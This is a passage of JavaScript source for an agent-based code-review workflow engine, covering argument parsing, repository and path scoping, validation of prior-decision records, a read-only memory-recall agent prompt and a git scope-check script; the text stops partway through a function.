export const meta = {
  name: 'review',
  description: 'Elastic deep review of a diff — auto-detects the language(s) touched, scout-scaled lens fan-out, loop-until-dry, tool-grounded seed findings, adversarial + self-verification, synthesized into one Confirmed/Suspected/Unverified report with a verdict. Rust and Nix profiles built in.',
  whenToUse: 'The single review path for any diff/PR before commit or merge. priorDecisions is optional: without it the engine itself recalls the active decisions for the paths of the diff through the craft:memory skill, and the report names the source (an empty list skips the recall). To post findings on a PR pass comment — never post findings by hand: only comments from the engine carry the marker that ties a later rejection to its finding. Auto-detects language; pin with args.languages (e.g. ["rust"] or ["nix"]). Scales depth to the diff automatically. To review ANOTHER repository pass repo=<absolute path> — without it every git command runs in the checkout the session itself sits in; path= is a repo-relative pathspec, NOT a way to select the repo. The performance / api-idioms / api-boundary lenses are an OPTIONAL pass that is OFF by default — request it with optional=true (or optional=performance,api-boundary); every report names what it skipped. priorDecisions — ONLY inside an object argument, {priorDecisions: [<the active decision records of the project, recalled by the memory skill for the paths of the diff>]}; as a string (key=value or JSON text) it is refused and nothing of it applied, and in a key=value string nothing after it is read as an option — sets aside a finding the project already rejected — listed under Rejected before with who, when, why and a link, never dropped — unless it is Critical/High or its scope changed since the commit of the decision; a malformed value applies nothing and is named in the report. deadlineMs=<ms> is a diagnostic knob, not a review option: it replaces the per-phase wall-clock deadline table wholesale and will kill healthy lenses if set below their real duration.',
  phases: [
    { title: 'Scout', detail: 'cheap classification: resolve the diff base, detect language(s), classify size/categories, pick lenses (rigor is derived from the size, in code)', model: 'haiku' },
    { title: 'Gate', detail: 'per-language CI-aware mechanical gate + tool-grounded seed findings' },
    { title: 'Lenses', detail: 'parallel per-lens review with context expansion; loop-until-dry' },
    { title: 'Verify', detail: 'cross-lens dedup, then adversarial refutation + self-verification of each finding' },
    { title: 'Synthesize', detail: 'calibrate severities, completeness critic, one merged report' },
  ],
}

/**
 * @typedef {Awaited<ReturnType<typeof reviewProfile>>} Result  one profile's facts from reviewProfile
 * @typedef {{ sizeBucket: string, lenses: string[], maxRounds: number, verifyVotes: number, lensModel: string, isLibrary: boolean, securitySensitive: boolean, intent: string, spec: string, churn: string[] }} Plan
 * @typedef {VerdictAnswer} Vote  one verifier verdict (model output, VERDICT_SCHEMA or one BATCH_VERDICT_SCHEMA entry)
 * @typedef {PriorRoundAnswer} PriorRound  the loaded prior round (loader agent output)
 * @typedef {ReturnType<typeof sliceDiff>[number]} Slice
 * @typedef {AgentOptions & { deadlineMs?: number | undefined, breaker?: ReturnType<typeof makeDeathBreaker> | null | undefined }} AgentOpts  agent() options plus the two this engine strips; closed, so a misspelt option is a type error
 * @typedef {{ why?: string, file?: string, severity?: string, title?: string, line?: number, source?: string, ruleId?: string, fp?: string, symbol?: string, tier?: string, disposition?: string, whyRef?: { record?: unknown, fp?: unknown }, fix?: string, whereChecked?: string, blastRadius?: string, verifySkipped?: boolean, votesDiscarded?: number, carriedUnverified?: boolean, ledgerDupOfUnverifiedPrior?: boolean, [k: string]: unknown }} Finding  a finding as a model reports it (FindingAnswer, LedgerAnswer), then as the pipeline stamps it
 * @typedef {PreflightAnswer} Preflight  the preflight agent's answer (model output)
 * @typedef {{ baseRef?: unknown, preflight?: Preflight | null, isLibrary?: boolean, securitySensitive?: boolean }} Ctx  what a profile's gate prompt is built from
 * @typedef {{ id: string, lang: string, detect: (files: string[]) => boolean, diffGlobs: string[], rubricSkill: string, fpRules: string, rollupRuleIds: string[], navSkill: string, reviewerAgent: string, securityHints: string, usesLibrary: boolean, alwaysLenses: string[], safetyLens: string, scoutRules: string, gate: (ctx: Ctx) => string, depContext: (ctx: Ctx) => string, lenses: string[], lensBrief: Record<string, string> }} Profile
 */
/**
 * A JSON schema handed to agent(), tagged with the shape the sandbox validates the answer into. The tag
 * is never set at runtime; it only lets `ragent` return `T | null` for the schema it was given.
 * @template T
 * @typedef {{ type: string, readonly __yields?: T, [k: string]: unknown }} Schema
 */
/**
 * The answers of the schema'd agents, one per schema below — each mirrors its schema's `required` and
 * optional properties exactly.
 * @typedef {{ runner: string, blockers: string[], missingTools: string[], ciCovers: string[], probes: Array<{ source: string, calls: number }>, partial: boolean, notes: string }} PreflightAnswer  PREFLIGHT_SCHEMA
 * @typedef {{ severity: 'Critical' | 'High' | 'Medium' | 'Low' | 'Info', title: string, file: string, line: number, why: string, whereChecked: string, fix: string, blastRadius: string, source: string, ruleId: string, fp?: string, symbol?: string, tier?: string, disposition?: string }} FindingAnswer  FINDING_ITEM
 * @typedef {{ fp: string, file: string, line: number, symbol: string, severity: string, tier: string, disposition: string, source: string, sources?: string[], ruleId: string, title: string, why: string, whyRef?: { record: string, fp: string } }} LedgerAnswer  LEDGER_ITEM
 * @typedef {{ found: boolean, round: number, head: string, ledger: LedgerAnswer[], ledgerCount: number, reason: string, priorFindings: number, journalSourced: boolean, sameFpBasis?: boolean, fpBasisKnown?: boolean, priorFpRevisions?: number[], priorFpRevisionsCheck?: string }} PriorRoundAnswer  PRIOR_ROUND_SCHEMA
 * @typedef {{ baseRef: string, files: string[], spec: string, branch: string, head: string, notes: string }} DetectAnswer  DETECT_SCHEMA
 * @typedef {{ sizeBucket: 'small' | 'medium' | 'large', lenses: string[], isLibrary: boolean, securitySensitive: boolean, intent: string, churn: string[], notes: string, surfaces?: { crossBoundarySymbol?: boolean, wireForm?: boolean, invariantType?: boolean } }} ScoutAnswer  SCOUT_SCHEMA
 * @typedef {{ status: 'pass' | 'fail' | 'unknown', provenance: string, failedChecks: string[], carriedChecks: string[], seedFindings: FindingAnswer[], notes: string }} GateAnswer  GATE_SCHEMA
 * @typedef {{ lens: string, findings: FindingAnswer[] }} FindingsAnswer  FINDINGS_SCHEMA
 * @typedef {{ refuted: boolean, citedLineMatches: boolean, reachable: boolean, premiseSupported: boolean, reason: string }} VerdictAnswer  VERDICT_SCHEMA
 * @typedef {{ verdicts: Array<VerdictAnswer & { index: number }> }} BatchVerdictAnswer  BATCH_VERDICT_SCHEMA
 * @typedef {{ missingLenses: string[], notes: string }} CriticAnswer  CRITIC_SCHEMA
 * @typedef {{ changed: boolean, reason: string }} ChangedAnswer  CHANGED_SCHEMA
 * @typedef {{ posted: number, reason: string }} PrCommentsAnswer  PR_COMMENTS_SCHEMA
 * @typedef {{ status: 'resolved' | 'still-open' | 'cannot-tell' | 'regressed', currentLine: number, note: string, invariant: string, attack: string }} AdjudicateAnswer  ADJUDICATE_SCHEMA
 * @typedef {{ defeated: boolean, attack: string }} AttackAnswer  ATTACK_SCHEMA
 * @typedef {{ runDir: string, error?: string }} CheckpointAnswer  CHECKPOINT_SCHEMA
 * @typedef {{ groups: number[][] }} DedupAnswer  DEDUP_SCHEMA
 */

// ---- args ----
// Three plausible spellings arrive here — a real object, a JSON string, and the `key=value` form the
// skill's own invocation line advertises — and only the first used to work. The other two fell
// through every `typeof args === 'object'` guard, so every option reverted to its default and the
// run reviewed whatever the session was sitting in, then reported a confident verdict for a diff
// nobody asked about. Shared with every other engine (lib/workflow-args.mjs, inlined below).
// >>> craft-inline lib/workflow-args.mjs applyOption OBJECT_ONLY_OPTIONS parseOptions normalizeJsonArgs normalizeKeyValueArgs normalizeArgs
/**
 * @param {RegExpExecArray} m
 * @param {Record<string, unknown>} out
 * @param {string[]} ignored
 * @returns {number}
 */
function applyOption(m, out, ignored) {
  /** @param {string} k */
  const banned = k => k === '__proto__' || k === 'constructor' || k === 'prototype'
  if (m[7]) {
    if (banned(m[7])) { ignored.push(m[7]); return 0 }
    out[m[7]] = true
    return 1
  }
  const key = /** @type {string} */ (m[2])
  if (banned(key)) { ignored.push(key); return 0 }
  const quoted = m[4] ?? m[5]
  if (quoted !== undefined) { out[key] = quoted; return 1 }
  try {
    out[key] = JSON.parse(/** @type {string} */ (m[3]))
  } catch {
    out[key] = /** @type {string} */ (m[3])
  }
  return 1
}

const OBJECT_ONLY_OPTIONS = ['priorDecisions']

/**
 * @param {string} text
 * @returns {{ options: Record<string, unknown>, pairs: number, ignored: string[], cut: string }}
 */
function parseOptions(text) {
  const pair = /(--?)?(\w[\w-]*)=("([^"]*)"|'([^']*)'|\S+)|(--)(\w[\w-]*)/g
  /** @type {Record<string, unknown>} */
  const out = {}
  let pairs = 0
  /** @type {string[]} */
  const ignored = []
  let m
  let cursor = 0
  while ((m = pair.exec(text)) !== null) {
    const gap = text.slice(cursor, m.index).trim()
    if (gap) ignored.push(...gap.split(/\s+/))
    const key = String(m[2] ?? m[7])
    if (OBJECT_ONLY_OPTIONS.includes(key)) { out[key] = text.slice(m.index); return { options: out, pairs: pairs + 1, ignored, cut: key } }
    cursor = pair.lastIndex
    pairs += applyOption(m, out, ignored)
  }
  const tail = text.slice(cursor).trim()
  if (tail) ignored.push(...tail.split(/\s+/))
  return { options: out, pairs, ignored, cut: '' }
}

/**
 * @param {string} text
 * @param {(msg: string) => void} warn
 * @returns {Record<string, unknown>}
 */
function normalizeJsonArgs(text, warn) {
  try {
    const parsed = JSON.parse(text)
    if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
      warn('⚠️ args arrived as a JSON string, not an object — parsed it; pass a real object to avoid this')
      return parsed
    }
    warn('⚠️ args arrived as a non-object JSON value — ALL options ignored, running with defaults')
    return {}
  } catch (e) {
    warn(`⚠️ args arrived as a string that looks like JSON but is not (${String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 60)}) — ALL options ignored, running with defaults`)
    return {}
  }
}

/**
 * @param {string} text
 * @param {(msg: string) => void} warn
 * @returns {Record<string, unknown>}
 */
function normalizeKeyValueArgs(text, warn) {
  const { options, pairs, ignored, cut } = parseOptions(text)
  if (cut) warn(`⚠️ ${cut} arrived in the key=value string — it and everything after it were not read as options (its value cannot be delimited there); pass args as an object`)
  if (pairs) {
    warn('⚠️ args arrived as a key=value string — parsed it; pass a real object to avoid this')
    if (ignored.length) {
      warn(`⚠️ ignored ${ignored.length} word(s) in args that are not options (${ignored.slice(0, 6).join(' ')}) — quote a value that contains spaces`)
    }
    return options
  }
  warn(`⚠️ args arrived as an unrecognized string (${text.slice(0, 40)}) — ALL options ignored, running with defaults`)
  return {}
}

/**
 * Normalize whatever arrived into an options object.
 *
 * `warn` is called with one human sentence per degradation and must not throw — engines pass their
 * `log`. It is called on the recovered forms too, deliberately: a run that silently accepted a
 * shape it had to repair teaches the next caller nothing.
 *
 * @param {unknown} args
 * @param {(msg: string) => void} [warn]
 * @returns {Record<string, unknown>}
 */
function normalizeArgs(args, warn = () => {}) {
  if (args && typeof args === 'object' && !Array.isArray(args)) return /** @type {Record<string, unknown>} */ (args)
  if (typeof args !== 'string' || !args.trim()) return {}
  const text = args.trim()
  if (text.startsWith('[') || text.startsWith('"')) {
    warn(`⚠️ args arrived as a JSON value that is not an object (${text.slice(0, 40)}) — ALL options ignored, running with defaults`)
    return {}
  }
  if (text.startsWith('{')) return normalizeJsonArgs(text, warn)
  return normalizeKeyValueArgs(text, warn)
}
// <<< craft-inline
/** @type {Record<string, unknown>} */
const A = normalizeArgs(args, log)
/** A string argument as given, or '' when it is absent or falsy. @param {string} key */
function argString(key) {
  return A[key] ? String(A[key]) : ''
}
const baseArg = argString('base')
const intentArg = argString('intent')
const postComments = !!A['comment']
let pathArg = argString('path')   // optional crate-scope (audit per-crate fan-out)
// Absolute path to the repo under review, when it is NOT the directory the session runs in. Without
// it every agent runs `git diff` wherever the session happens to sit, so craft could only ever review
// its own checkout — reviewing a PR in another repo silently reviewed craft instead.
let repoArg = argString('repo')
// `path` is a git PATHSPEC resolved against the reviewed repo; `repo` selects the repo. An ABSOLUTE
// `path` is therefore ambiguous in the one way the sandbox cannot resolve: it is either a repo the
// caller meant to select, or a directory INSIDE the repo they meant to narrow to — and with no disk
// and no Node API here, nothing can tell those apart. Both wrong guesses are expensive and neither
// is loud. Guessing "repo" turns a narrowing request into a confident WHOLE-repo review wearing the
// narrow label; leaving it as a pathspec matches nothing, and the run comes back as an empty diff
// that reads like "no changes" — measured 2026-09-17 at 57 agents and 2.04M tokens, every one of
// the 14 lenses independently rediscovering that there was nothing to read.
// So: resolve it when the prefix DECIDES it, and refuse to guess otherwise (realm @nick/craft, #65).
// `~` counts as absolute here because the agent's shell expands it before git ever sees the pathspec.
const ABSOLUTE_PATH = /^(\/|~(\/|$)|[A-Za-z]:[\\/])/
let ambiguousPath = ''
// A scope the caller asked for and did NOT get. It rides into `notRun` and therefore into the
// verdict line, not only into `log()`: dropping a narrowing widens the review to the WHOLE repo, so
// what was ordered and what was done diverge — and the person who reads the verdict is not the
// person who reads the log. An INCOMPLETE marker is the honest rendering of "we reviewed something
// else than you asked for", however green the findings are.
/** @type {string[]} */
let scopeNotRun = []
// The reader-facing twin of `scopeNotRun`: the same refusal spelled with this run's own paths, for
// the report. Kept apart because `notRun` is ranked by exact string (see the assignment below).
let scopeDetail = ''
// Containment decided on NORMALIZED SEGMENTS rather than on a raw string prefix. `repo=/r/` with
// `path=/r/./crates/../crates/core` is the same request as `repo=/r` with `path=crates/core`, and a
// prefix comparison reads it as "outside" — which silently WIDENS the review to the whole repository.
// Segments also settle the sibling case (`/r-evil` is not inside `/r`) that a bare `startsWith`
// accepts unless the separator is appended by hand.
// WHAT STAYS OUTSIDE THIS GUARD, because the sandbox has no disk and no Node API: a SYMLINK cannot be
// resolved (a path reaching the repo through a symlinked directory reads as outside), the comparison
// is case-SENSITIVE while macOS and Windows filesystems are not (`/R/crates` under `repo=/r` reads as
// outside), and a `..` that would climb above the first segment is kept as a literal segment, so such
// a path matches nothing. All three misread in the SAME direction — the scope is dropped, and a
// dropped scope is now reported in the verdict and in `notRun` — never in the direction of a
// narrowing that looks honoured and is not.
// The dropped scope, rendered into whichever report is returned — every early exit included, since
// the drop happened before all of them. Appended to the synthesized report too rather than asked of
// the synthesis model: what the review DID NOT cover is not something a prompt may forget.
const scopeSection = () => (scopeNotRun.length ? `\n\n## Scope\n⚠️ ${scopeDetail || scopeNotRun.join('\n⚠️ ')}\n` : '')
// The recalled rejections the launching session hands in as `priorDecisions` (realm @nick/craft, node #177 — the
// memory skill's record shape). Pasted in by the craft-inline gate; the rules and why live in the module.
// >>> craft-inline lib/prior-decision-record.mjs DECISION_FIELD_MAX decisionScopeParts decisionText decisionFields decisionProblem SAFE_SCOPE hasControlChar decisionAnchorProblem readPriorDecision
const DECISION_FIELD_MAX = { id: 80, title: 200, scope: 300, reason: 1200, who: 120, when: 40, link: 500 }

/** Path segments with `.`, empty segments and separators folded; `..` kept literal. @param {string} p */
function decisionScopeParts(p) {
  return p.split(/[\\/]+/).filter(s => s && s !== '.')
}

/** @param {unknown} v @returns {string} */
function decisionText(v) {
  return typeof v === 'string' ? v.trim() : ''
}

/**
 * The decision's fields as strings, trimmed. A memory record (skills/memory) is read as it is
 * recalled: `body`, `date` and `author` stand in for `reason`, `when` and `who`, and the first
 * http(s) URL in `links` for `link`.
 * @param {Record<string, unknown>} o @returns {PriorDecision}
 */
function decisionFields(o) {
  /** @param {string} k @param {string} [alt] */
  const f = (k, alt = '') => decisionText(o[k]) || decisionText(o[alt])
  const links = Array.isArray(o['links']) ? o['links'] : []
  const url = decisionText(links.find(l => /^https?:\/\//.test(decisionText(l))))
  return { id: f('id'), title: f('title'), scope: f('scope') || '.', reason: f('reason', 'body'), who: f('who', 'author'), when: f('when', 'date'), link: f('link') || url, commit: f('commit') }
}

/**
 * What is wrong with a decision, as the tail of a refusal sentence; '' when nothing is.
 * @param {Record<string, unknown>} o @param {PriorDecision} d @returns {string}
 */
function decisionProblem(o, d) {
  if (o['kind'] != null && decisionText(o['kind']) !== 'decision') return ` is a ${JSON.stringify(o['kind'])} record, not a decision`
  if (o['status'] != null && decisionText(o['status']) !== 'active') return ` is not active (status ${JSON.stringify(o['status'])})`
  if (!d.id || !d.title || !d.reason) return ' lacks an id, a title or a reason'
  const over = Object.entries(DECISION_FIELD_MAX).find(([k, max]) => d[/** @type {keyof PriorDecision} */ (k)].length > max)
  if (over) return `: ${over[0]} is ${d[/** @type {keyof PriorDecision} */ (over[0])].length} chars, over the ${over[1]}-char ceiling`
  return decisionAnchorProblem(d)
}

const SAFE_SCOPE = /^[A-Za-z0-9._@+/ -]+$/

/** Whether `s` holds a control character (a newline among them). @param {string} s */
function hasControlChar(s) {
  return [...s].some(c => c.charCodeAt(0) < 32 || c.charCodeAt(0) === 127)
}

/**
 * The id, the scope and the commit go into a shell line (scopeCheckScript) and the agent prompt that
 * carries it: no control character in any, the scope a repo-relative path of safe characters, the
 * commit a hash. '' when all hold.
 * @param {PriorDecision} d @returns {string}
 */
function decisionAnchorProblem(d) {
  const ctl = /** @type {const} */ (['id', 'scope', 'commit']).find(k => hasControlChar(d[k]))
  if (ctl) return `: ${ctl} contains a control character`
  if (/^([\\/]|~|[A-Za-z]:)/.test(d.scope) || decisionScopeParts(d.scope).includes('..')) return `: scope ${JSON.stringify(d.scope)} is not a repo-relative path`
  if (!SAFE_SCOPE.test(d.scope)) return `: scope ${JSON.stringify(d.scope)} has a character outside letters, digits and ._@+/ -`
  if (d.commit && !/^[0-9a-f]{7,40}$/i.test(d.commit)) return `: commit ${JSON.stringify(d.commit)} is not a commit hash`
  return ''
}

/**
 * One decision as given, checked: a refusal sentence, or the decision.
 * @param {unknown} raw @param {number} i @returns {PriorDecision | string}
 */
function readPriorDecision(raw, i) {
  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return `decision #${i} is not an object`
  const o = /** @type {Record<string, unknown>} */ (raw)
  const d = decisionFields(o)
  const problem = decisionProblem(o, d)
  return problem ? `decision #${i}${d.id && !hasControlChar(d.id) ? ` (${d.id})` : ''}${problem}` : d
}
// <<< craft-inline
// >>> craft-inline lib/prior-decisions.mjs PRIOR_DECISIONS_MAX DECISION_TITLE_OVERLAP parsePriorDecisions titleWords decisionAnswers reraisedBySeverity priorDecisionsRefusedSection
const PRIOR_DECISIONS_MAX = 100

const DECISION_TITLE_OVERLAP = 0.6

/**
 * The `priorDecisions` argument, checked. Absent → nothing applied, no refusal (the engine recalls instead:
 * lib/memory-recall.mjs). Anything else that is not a list → nothing applied, each problem named.
 * @param {unknown} raw
 * @returns {{ decisions: PriorDecision[], refused: string[] }}
 */
function parsePriorDecisions(raw) {
  if (raw == null || raw === '') return { decisions: [], refused: [] }
  if (typeof raw === 'string') return { decisions: [], refused: ['priorDecisions arrived as a string — only a list inside an object argument is read (in a key=value string nothing from priorDecisions on was read as an option) — no decision applied'] }
  const list = raw
  if (!Array.isArray(list)) return { decisions: [], refused: ['priorDecisions is not a list — no decision applied'] }
  /** @type {PriorDecision[]} */
  const decisions = []
  /** @type {string[]} */
  const refused = []
  list.slice(0, PRIOR_DECISIONS_MAX).forEach((item, i) => {
    const d = readPriorDecision(item, i)
    if (typeof d === 'string') refused.push(d)
    else if (decisions.some(x => x.id === d.id)) refused.push(`decision #${i} (${d.id}) repeats an id already given — not applied`)
    else decisions.push(d)
  })
  if (list.length > PRIOR_DECISIONS_MAX) {
    refused.push(`${list.length - PRIOR_DECISIONS_MAX} decision(s) past the cap of ${PRIOR_DECISIONS_MAX} were not applied — findings they would answer are raised normally`)
  }
  return { decisions, refused }
}

/** Lower-cased alphanumeric words of a title. @param {unknown} t */
function titleWords(t) {
  return new Set(String(t ?? '').toLowerCase().split(/[^a-z0-9]+/).filter(Boolean))
}

/**
 * Whether `d` answers finding `f`: the file inside the scope, and the titles overlapping enough.
 * @param {DecidableFinding} f @param {PriorDecision} d @returns {boolean}
 */
function decisionAnswers(f, d) {
  const file = decisionScopeParts(String(f.file ?? ''))
  const scope = decisionScopeParts(d.scope)
  if (!file.length || scope.length > file.length || scope.some((s, i) => s !== file[i])) return false
  const a = titleWords(f.title)
  const b = titleWords(d.title)
  if (!a.size || !b.size) return false
  let shared = 0
  for (const w of a) if (b.has(w)) shared++
  return shared / Math.max(a.size, b.size) >= DECISION_TITLE_OVERLAP
}

/** Critical/High are always raised again (realm @nick/craft, node #187). @param {unknown} sev */
function reraisedBySeverity(sev) {
  return /^(critical|high)$/i.test(String(sev ?? '').trim())
}

/**
 * The report section naming what of `priorDecisions` was not applied; empty when everything was.
 * @param {string[]} refused @returns {string}
 */
function priorDecisionsRefusedSection(refused) {
  if (!refused.length) return ''
  return `\n\n## Prior decisions not applied\n${refused.map(r => `- ⚠️ ${r}`).join('\n')}\n`
}
// <<< craft-inline
// >>> craft-inline lib/memory-recall.mjs RECALL_PATHS_MAX RECORD_TEXT_FIELDS MEMORY_RECALL_SCHEMA memoryRecallPrompt recallText staleTail readMemoryRecall initialMemory acceptedMemory memoryLine memorySection recallDecisions
const RECALL_PATHS_MAX = 60

const RECORD_TEXT_FIELDS = ['id', 'kind', 'title', 'body', 'scope', 'status', 'date', 'author', 'commit']

const MEMORY_RECALL_SCHEMA = {
  type: 'object', additionalProperties: false, required: ['backend', 'why', 'decisions'],
  properties: {
    backend: { type: 'string', description: 'the memory backend recall used, or none' },
    why: { type: 'string', description: 'one line: the rule that chose the backend, or why there is none, or that recall found nothing' },
    decisions: {
      type: 'array', description: 'the matching active decision records, verbatim',
      items: { type: 'object', properties: { ...Object.fromEntries(RECORD_TEXT_FIELDS.map(k => [k, { type: 'string' }])), links: { type: 'array', items: { type: 'string' } } } },
    },
    stale: {
      type: 'array', description: 'matching active decisions that no longer hold against the code, left out of decisions and NOT superseded',
      items: { type: 'object', properties: { id: { type: 'string' }, why: { type: 'string' } } },
    },
  },
}

/**
 * The recall agent's prompt: the skill first, its backend order when the skill is unavailable.
 * @param {string[]} paths the diff's changed paths; none → the agent lists them from the base
 * @param {string} base @returns {string}
 */
function memoryRecallPrompt(paths, base) {
  const listed = paths.slice(0, RECALL_PATHS_MAX)
  const cut = paths.length - listed.length
  const scope = listed.length
    ? `these changed paths of the diff:\n${listed.map(p => `- ${p}`).join('\n')}${cut ? `\n(${cut} more path(s) cut at the bound of ${RECALL_PATHS_MAX} — not recalled for)` : ''}`
    : `the paths of \`git diff --name-only ${base || '$(git merge-base origin/main HEAD)'}...HEAD\``
  return `Recall the remembered decisions of this project for a code review. READ ONLY: write, record, edit or create nothing anywhere (no memory record, no file, no MCP create call).
Scope: ${scope}
1. Invoke the craft:memory skill with the Skill tool and run its recall for those paths: kind decision, status active only, no topic.
2. If that skill is unavailable, follow its backend order yourself; the first that applies wins: (a) an explicit setting, env CRAFT_MEMORY, else a line \`craft-memory: <value>\` in AGENTS.md or CLAUDE.md at the repo root (mcp | harness | repo | none; a pinned backend that is unavailable means none); (b) a connected memory or knowledge-graph MCP server found by capability: load the deferred tools of the session with ToolSearch and take a server whose tools offer both a search over stored items and a create of a new item, judged by what the tools do, never by a server or tool name; use only its search; (c) the project memory files of the harness: Claude Code keeps them in \`~/.claude/projects/<slug>/memory/\` with \`MEMORY.md\` as the index, where <slug> is your own working directory (\`pwd\`, after any cd this review requires) with every character that is not an ASCII letter or digit replaced by \`-\` (observed: \`/home/ubuntu/projects/my/craft\` → \`-home-ubuntu-projects-my-craft\`; \`/.claude/\` → \`--claude-\`) — an observed convention (realm @nick/craft, node #201); list \`~/.claude/projects/\` and take the directory whose name equals that slug; read MEMORY.md, then only the matching files; none equals it: say \`none — harness memory directory for <cwd> not found under ~/.claude/projects/\` and never guess a near match; (d) \`.craft/memory/decision/\` in the repo. None applies: backend none.
3. A record matches a path when its scope equals the path, is a directory containing it, names its component, or is \`.\`.
4. A stale matching decision — one that no longer holds against the code as it is now (its reason is gone): supersede nothing — leave it out of decisions and list it in stale as {id, why}; superseding stays with craft:addressing-findings.
Return {backend, why, decisions, stale}: backend names the store used (or none); why is one line naming the rule that chose it, or why there is none, or that recall found nothing; decisions are the matching active decision records verbatim in the record shape id, kind, title, body, scope, status, date, author, commit, links (nothing rewritten or summarised; [] when none); stale is [] when none.`
}

/** @typedef {{ source: 'passed' | 'recalled' | 'none', count: number, why: string }} MemorySource */
/** @param {unknown} v @returns {string} */
const recallText = v => (typeof v === 'string' ? v.replace(/\s+/g, ' ').trim() : '')

/** The stale decisions the agent left out, as one line's tail. @param {unknown} list @returns {string} */
function staleTail(list) {
  const named = (Array.isArray(list) ? list : []).flatMap(x => {
    const r = /** @type {Record<string, unknown>} */ (x && typeof x === 'object' ? x : {})
    const id = recallText(r['id'])
    return id ? [`${id} (${recallText(r['why']) || 'no reason given'})`] : []
  })
  return named.length ? `; stale, left out: ${named.join(', ')}` : ''
}

/**
 * What the recall agent returned, read: the decisions to hand to parsePriorDecisions (a list, possibly
 * empty) and the source to report. A dead or off-shape answer applies nothing and is named.
 * @param {unknown} raw @param {number} cut paths past RECALL_PATHS_MAX @returns {{ decisions: unknown[], memory: MemorySource }}
 */
function readMemoryRecall(raw, cut) {
  const r = /** @type {Record<string, unknown>} */ (raw && typeof raw === 'object' && !Array.isArray(raw) ? raw : {})
  const tail = cut > 0 ? `; ${cut} changed path(s) past the bound of ${RECALL_PATHS_MAX} were not recalled for` : ''
  const list = r['decisions']
  if (!Array.isArray(list)) return { decisions: [], memory: { source: 'none', count: 0, why: `the recall agent died or returned no decision list, so no project memory was applied — findings are raised normally${tail}` } }
  const backend = recallText(r['backend']) || 'an unnamed backend'
  const why = recallText(r['why']) || 'no reason given'
  const stale = staleTail(r['stale'])
  if (!list.length) return { decisions: [], memory: { source: 'none', count: 0, why: `${why} (backend ${backend})${stale}${tail}` } }
  return { decisions: list, memory: { source: 'recalled', count: list.length, why: `${backend} (${why})${stale}${tail}` } }
}

/**
 * The source before any recall: passed by the launcher (any value, an empty list included), or not yet recalled.
 * @param {unknown} raw the priorDecisions argument @param {number} [count] the decisions accepted; the list length by default
 * @returns {MemorySource}
 */
function initialMemory(raw, count = Array.isArray(raw) ? raw.length : 0) {
  return raw == null || raw === ''
    ? { source: 'none', count: 0, why: 'not recalled — the run ended before its recall step' }
    : { source: 'passed', count, why: 'passed by the launcher' }
}

/**
 * A recalled source once parsePriorDecisions read its list: the count is the records it accepted; the
 * refused are named in their own section. @param {MemorySource} m @param {number} accepted @returns {MemorySource}
 */
function acceptedMemory(m, accepted) {
  return m.source === 'recalled' ? { ...m, count: accepted } : m
}

/** @param {MemorySource} m @returns {string} */
function memoryLine(m) {
  if (m.source === 'passed') return `memory: passed by the launcher (${m.count})`
  return m.source === 'recalled' ? `memory: recalled ${m.count} decision(s) from ${m.why}` : `memory: none — ${m.why}`
}

/** The report section naming the source. @param {MemorySource} m @returns {string} */
function memorySection(m) {
  return `\n\n## Memory\n- ${memoryLine(m)}\n`
}

/**
 * Runs the one recall agent through `ask` (the engine's agent call, schema MEMORY_RECALL_SCHEMA). A
 * refused dispatch (the budget wall) is named and applies nothing: the run meets the same wall on its
 * next dispatch, as it would have without a recall.
 * @param {(prompt: string) => Promise<unknown>} ask @param {string[]} paths @param {string} base
 * @returns {Promise<{ decisions: unknown[], memory: MemorySource }>}
 */
async function recallDecisions(ask, paths, base) {
  let raw
  try {
    raw = await ask(memoryRecallPrompt(paths, base))
  } catch (e) {
    const msg = recallText(e instanceof Error ? e.message : String(e))
    return { decisions: [], memory: { source: 'none', count: 0, why: `the recall agent did not run (${msg}) — no project memory applied; findings are raised normally` } }
  }
  return readMemoryRecall(raw, Math.max(0, paths.length - RECALL_PATHS_MAX))
}
// <<< craft-inline
// >>> craft-inline lib/prior-decision-scope.mjs decisionsToCheck scopeCheckScript SCOPE_CHECK_SCHEMA scopeCheckPrompt readScopeCheck runScopeCheck
/**
 * The decisions whose scope must be checked for change: those that answer some finding a decision
 * could set aside (not Critical/High) and that recorded a commit to compare against.
 * @param {DecidableFinding[]} findings @param {PriorDecision[]} decisions @returns {PriorDecision[]}
 */
function decisionsToCheck(findings, decisions) {
  const out = new Set(/** @type {PriorDecision[]} */ ([]))
  for (const f of findings) {
    if (reraisedBySeverity(f.severity)) continue
    const d = decisions.find(x => decisionAnswers(f, x))
    if (d && d.commit) out.add(d)
  }
  return [...out]
}

/**
 * The shell lines the scope check runs, one per decision: when the repo knows the decision's commit,
 * `git diff --quiet` against it, printing the id and the exit status (0 = unchanged since the commit,
 * working tree included); when it does not (a squash-merged branch, another clone), the id and
 * `missing`. Arguments single-quoted.
 * @param {PriorDecision[]} decisions @returns {string}
 */
function scopeCheckScript(decisions) {
  /** @param {string} s */
  const q = s => `'${s.replace(/'/g, `'\\''`)}'`
  return decisions.map(d => `if git cat-file -e ${q(`${d.commit}^{commit}`)} 2>/dev/null; then git diff --quiet ${q(d.commit)} -- ${q(d.scope)}; echo ${q(d.id)} $?; else echo ${q(d.id)} missing; fi`).join('\n')
}

const SCOPE_CHECK_SCHEMA = {
  type: 'object', additionalProperties: false, required: ['unchanged', 'missing', 'reason'],
  properties: {
    unchanged: { type: 'array', items: { type: 'string' }, description: 'ids whose line ended in exit status 0, exactly as printed' },
    missing: { type: 'array', items: { type: 'string' }, description: 'ids whose line ended in the word missing, exactly as printed' },
    reason: { type: 'string', description: 'one line: anything that did not run' },
  },
}

/** The scope-check agent's prompt. @param {PriorDecision[]} decisions @returns {string} */
function scopeCheckPrompt(decisions) {
  return `Run these lines in the repository under review, exactly as written (shell only, read only). Each prints a decision id and the exit status of \`git diff --quiet\` against that decision's commit, or the word missing when the repository does not have that commit.
${scopeCheckScript(decisions)}
Return {unchanged: [every id whose printed status was 0], missing: [every id printed with the word missing], reason: one line on anything that did not run}.`
}

/**
 * The ids a scope-check answer names unchanged and missing, or null when the answer is absent or its
 * `unchanged` unreadable — then no decision is shown unchanged and nothing is set aside.
 * @param {unknown} ans @returns {{ unchanged: string[], missing: string[] } | null}
 */
function readScopeCheck(ans) {
  const o = ans && typeof ans === 'object' ? /** @type {Record<string, unknown>} */ (ans) : {}
  /** @param {unknown} v */
  const ids = v => (Array.isArray(v) ? v.filter(x => typeof x === 'string') : [])
